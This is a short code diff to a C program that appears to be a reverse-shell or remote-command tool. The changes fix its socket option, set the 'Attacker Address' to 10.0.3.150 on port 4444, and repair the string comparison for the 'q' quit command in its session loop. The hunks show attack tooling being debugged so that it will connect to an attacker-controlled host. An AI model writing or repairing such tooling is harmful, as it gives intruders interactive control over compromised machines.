@@ -45,7 +45,7 @@ int main()
     //Now will set some socket options
     //Using optval variable check the sock object options.
     //if the options fianl output is less than 0 zero it could lead to an error.
-    if (setsockopt(sock, SOL_SOCKET, SOL_REUSEADDR, &optval, sizeof(optval)) < 0)
+    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
     {
         printf("Error Setting TCP Socket Option.\n");
         return 1;
@@ -55,7 +55,7 @@ int main()
     //IP, Port
 
     server_address.sin_family = AF_INET; //IPv4
-    server_address.sin_addr.s_addr = inet_addr("10.0.0.0"); //Attacker Address
+    server_address.sin_addr.s_addr = inet_addr("10.0.3.150"); //Attacker Address
     server_address.sin_port = htons(4444);//Target port
 
 
@@ -100,7 +100,7 @@ int main()
 
 
         //If buffer specify q option want to terminate the session.
-        if (strcmp("q", buffer, 1) == 0)
+        if (strcmp("q", buffer) == 0)
         {
             //No need WSA cleanup here for the process termination because the program is running on the linux environment.
             break;
